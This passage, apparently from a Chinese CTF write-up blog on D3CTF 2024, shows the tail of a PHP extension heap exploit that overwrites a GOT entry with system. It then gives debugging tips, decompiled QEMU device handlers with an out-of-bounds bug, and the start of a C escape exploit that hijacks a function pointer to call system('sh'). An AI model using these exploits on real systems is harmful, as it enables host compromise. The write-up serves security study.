class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$n</span> = <span class="number">0x61</span> + <span class="variable">$i</span>;</span><br><span class="line">    <span class="variable">$aa</span> = <span class="title function_ invoke__">pack</span>(<span class="string">&quot;C&quot;</span>, <span class="variable">$n</span>);</span><br><span class="line">    <span class="variable">$aaa</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="variable">$aa</span>, <span class="number">0x40</span>);</span><br><span class="line">    <span class="title function_ invoke__">addHacker</span>(<span class="variable">$aaa</span>, <span class="variable">$b</span>);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;/readflag &gt; /var/www/html/flag.txt\x00&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">editHacker</span>(<span class="number">0</span>,<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">7</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;c&quot;</span>, <span class="number">0x40</span>);</span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="variable">$a</span>, <span class="variable">$c</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">6</span>);</span><br><span class="line"><span class="title function_ invoke__">editHacker</span>(<span class="number">8</span>, <span class="title function_ invoke__">int2str</span>(<span class="variable">$mod_base</span>+<span class="variable">$efree_got</span>));</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="variable">$a</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="title function_ invoke__">int2str</span>(<span class="variable">$libc_base</span>+<span class="variable">$system_addr</span>),<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">addHacker</span>(<span class="variable">$payload</span>, <span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">removeHacker</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>这道题我感觉难点在于如何调试。这道题目给出了 <code>docker</code> 环境，所以我们可以在 <code>docker</code> 中启动 <code>gdbserver</code> 远程调试，其做法如下：  </p><img src="/2024/04/29/d3ctf2024/1.png" class="" title="我的图图呢">  <p>然后在另外一个终端中启动 <code>gdb</code>，然后输入 <code>target remote:8888</code> 即可连接<br>这里要注意的是，我 <code>docker</code> 是将其 <code>9999</code> 端口映射到物理机的 <code>8888</code> 端口，所以我在 <code>docker</code> 中启动 <code>gdbserver</code> 使用的是 <code>9999</code> 端口，在物理机中 <code>gdb</code> 远程连接的端口是 <code>8888</code><br>由于题目给的 <code>docker</code> 并没有安装 <code>gdbserver</code>，我们可以通过下面这条命令进行安装  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install gdbserver</span><br></pre></td></tr></table></figure><p>接下来就要说说调试技巧。由于程序要运行很多汇编代码后才会将 <code>vuln.so</code> 模块给加载进来，所以一直在 <code>gdb</code> 中使用 <code>si</code> 是行不通的，我的方法是在 <code>exp.php</code> 中使用 <code>fgetc(STDIN)</code> 来将程序卡住，然后在 <code>gdb</code> 中输入 <code>c</code> 来进行类似于断点的操作，但是这样的 <code>php</code> 文件运行时会发现系统报错说找不到 <code>fgetc</code> 这一个 <code>function</code>，这是应为在 <code>php.ini</code> 文件中将这一个函数给 <code>ban</code> 了，我们可以通过下面这一条指令来找到 <code>php.ini</code> 文件所在的文件夹  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -i | grep <span class="string">&quot;Configuration File (php.ini) Path&quot;</span></span><br></pre></td></tr></table></figure><p>在 <code>php.ini</code> 文件中我们找到 <code>disable_functions</code> 那个地方  </p><img src="/2024/04/29/d3ctf2024/2.png" class="" title="我的图图呢">  <p>可以看见我们要用的 <code>fgetc</code> 函数在最后一行，我们将其删除即可<br>下面给出一条用于查询 <code>php</code> 扩展模块所在的路径的命令  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php-config --extension-dir</span><br></pre></td></tr></table></figure><h1 id="D3EasyEscape"><a href="#D3EasyEscape" class="headerlink" title="D3EasyEscape"></a>D3EasyEscape</h1><p>这道题是 <code>qemu</code> 逃逸，之前没事干学了一下，这不刚好可以用上了，其关键函数如下：<br>l0dev_mmio_read：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">l0dev_mmio_read</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+30h] [rbp-20h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 addr_v7; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = sub_7F810F(opaque, <span class="string">&quot;l0dev&quot;</span>, <span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">82LL</span>, <span class="string">&quot;l0dev_mmio_read&quot;</span>);</span><br><span class="line">  dest = <span class="number">-1LL</span>;</span><br><span class="line">  addr_v7 = addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8</span> * addr_v7 + size &lt;= <span class="number">0x100</span> )</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;dest, (<span class="type">const</span> <span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)(*(_DWORD *)(v6 + <span class="number">0xA00</span>) + addr) + <span class="number">0xC30</span>LL + v6 + <span class="number">4</span>), size);</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>l0dev_pmio_read：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">l0dev_pmio_read</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+30h] [rbp-20h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 addr_v7; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v6 = sub_7F810F(opaque, <span class="string">&quot;l0dev&quot;</span>, <span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">104LL</span>, <span class="string">&quot;l0dev_pmio_read&quot;</span>);</span><br><span class="line">  dest = <span class="number">-1LL</span>;</span><br><span class="line">  addr_v7 = addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">8</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8</span> * addr_v7 + size &gt; <span class="number">0x100</span> )</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dest, (<span class="type">const</span> <span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)addr + <span class="number">0xC30</span>LL + v6 + <span class="number">4</span>), size);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)dest == <span class="number">666</span> )</span><br><span class="line">    ++dword_123B1CC;</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>l0dev_mmio_write：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">l0dev_mmio_write</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, __int64 value, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size_n; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  _QWORD n_4[<span class="number">3</span>]; <span class="comment">// [rsp+8h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> addr_v7; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  n_4[<span class="number">2</span>] = opaque;</span><br><span class="line">  n_4[<span class="number">1</span>] = addr;</span><br><span class="line">  n_4[<span class="number">0</span>] = value;</span><br><span class="line">  size_n = size;</span><br><span class="line">  v8 = sub_7F810F(opaque, <span class="string">&quot;l0dev&quot;</span>, <span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">133LL</span>, <span class="string">&quot;l0dev_mmio_write&quot;</span>);</span><br><span class="line">  v9 = addr &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  result = (<span class="type">void</span> *)addr;</span><br><span class="line">  addr_v7 = addr;</span><br><span class="line">  <span class="keyword">if</span> ( size_n &lt;= <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">void</span> *)(<span class="number">8</span> * v9 + size_n);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)result &lt;= <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr_v7 == <span class="number">0x40</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = n_4[<span class="number">0</span>];</span><br><span class="line">        addr_v7 = (*(<span class="type">int</span> (__fastcall **)(_QWORD *))(v8 + <span class="number">0xD48</span>))(n_4) % <span class="number">0x100</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)(addr_v7 + <span class="number">0xC30</span>LL + v8 + <span class="number">4</span>), n_4, size_n);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( addr_v7 == <span class="number">0x80</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = (<span class="type">void</span> *)n_4[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> ( n_4[<span class="number">0</span>] &lt;= <span class="number">0x100</span>uLL )</span><br><span class="line">        &#123;</span><br><span class="line">          result = (<span class="type">void</span> *)v8;</span><br><span class="line">          *(_DWORD *)(v8 + <span class="number">0xA00</span>) = n_4[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)(addr_v7 + <span class="number">0xC30</span>LL + v8 + <span class="number">4</span>), n_4, size_n);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>l0dev_pmio_write：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">l0dev_pmio_write</span><span class="params">(__int64 opaque, <span class="type">unsigned</span> __int64 addr, __int64 value, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  _DWORD n[<span class="number">3</span>]; <span class="comment">// [rsp+4h] [rbp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 addr_v6; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 addr_v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = opaque;</span><br><span class="line">  addr_v6 = addr;</span><br><span class="line">  *(_QWORD *)&amp;n[<span class="number">1</span>] = value;</span><br><span class="line">  n[<span class="number">0</span>] = size;</span><br><span class="line">  v9 = sub_7F810F(opaque, <span class="string">&quot;l0dev&quot;</span>, <span class="string">&quot;../qemu-7.0.0/hw/misc/l0dev.c&quot;</span>, <span class="number">173LL</span>, <span class="string">&quot;l0dev_pmio_write&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dword_123B1CC )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)(*(_DWORD *)(v9 + <span class="number">0xA00</span>) + addr_v6) + <span class="number">0xC30</span>LL + v9 + <span class="number">4</span>), &amp;n[<span class="number">1</span>], n[<span class="number">0</span>]);</span><br><span class="line">  result = (<span class="type">void</span> *)(addr_v6 &gt;&gt; <span class="number">3</span>);</span><br><span class="line">  addr_v10 = addr_v6 &gt;&gt; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( n[<span class="number">0</span>] &lt;= <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">void</span> *)(<span class="number">8</span> * addr_v10 + n[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)result &lt;= <span class="number">0x100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = addr_v6;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)((<span class="type">unsigned</span> <span class="type">int</span>)addr_v6 + <span class="number">0xC30</span>LL + v9 + <span class="number">4</span>), &amp;n[<span class="number">1</span>], n[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说实话，这道题目我看了好久才找到漏洞，还是做题做太少了。在 <code>l0dev_mmio_write</code> 函数中当 <code>addr_v7 == 0x80</code> 时我们可以对 <code>*(_DWORD *)(v8 + 0xA00)</code> 的值进行设置，而在 <code>l0dev_mmio_read</code> 函数中我们可以相对 <code>*(_DWORD *)(v8 + 0xA00)</code> 某个偏移范围内的数据进行读，在 <code>l0dev_pmio_write</code> 函数中我们可以相对 <code>*(_DWORD *)(v8 + 0xA00)</code> 某个偏移范围内的数据进行写，也就是说这里存在越界读和越界写。观察到 <code>l0dev_mmio_write</code> 函数中下面这一段代码：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( addr_v7 == <span class="number">0x40</span> )&#123;</span><br><span class="line">    v10 = n_4[<span class="number">0</span>];</span><br><span class="line">    addr_v7 = (*(<span class="type">int</span> (__fastcall **)(_QWORD *))(v8 + <span class="number">0xD48</span>))(n_4) % <span class="number">0x100</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">memcpy</span>((<span class="type">void</span> *)(addr_v7 + <span class="number">0xC30</span>LL + v8 + <span class="number">4</span>), n_4, size_n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看见 <code>(int (__fastcall **)(_QWORD *))(v8 + 0xD48)</code> 处存储的是一个函数指针，通过 <code>gdb</code> 我们可以发现其存储的是 <code>rand_r</code> 函数的地址，该函数位于 <code>libc</code> 上，所以我们可以通过越界读读取此处来获取 <code>libc</code> 的地址。可以看见这个地方是通过函数指针调用了函数，且函数的参数我们是可控的，所以我们可以劫持该函数指针执行 <code>system</code> 函数的地址，然后另函数从参数为 <code>sh</code> 即可实现逃逸<br>exp：  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> * mmio_mem;</span><br><span class="line"><span class="type">uint32_t</span> port_mem = <span class="number">0xc000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span>  <span class="title function_">pmio_read</span><span class="params">(<span class="type">uint32_t</span> port)</span> &#123; </span><br><span class="line">    <span class="keyword">return</span> inl(port_mem + port); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pmio_write</span><span class="params">(<span class="type">uint32_t</span> port, <span class="type">uint32_t</span> val)</span>&#123; </span><br><span class="line">    outl(val, port_mem + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span>&#123; </span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint32_t</span> *)(mmio_mem + addr); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint32_t</span> val)</span>&#123; </span><br><span class="line">    *(<span class="type">uint32_t</span> *)(mmio_mem + addr) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write64</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> val)</span>&#123; </span><br><span class="line">    *(<span class="type">uint64_t</span> *)(mmio_mem + addr) = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) !=<span class="number">0</span> )&#123;</span><br><span class="line">        perror(<span class="string">&quot;I/O permission is not enough&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mmap mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;    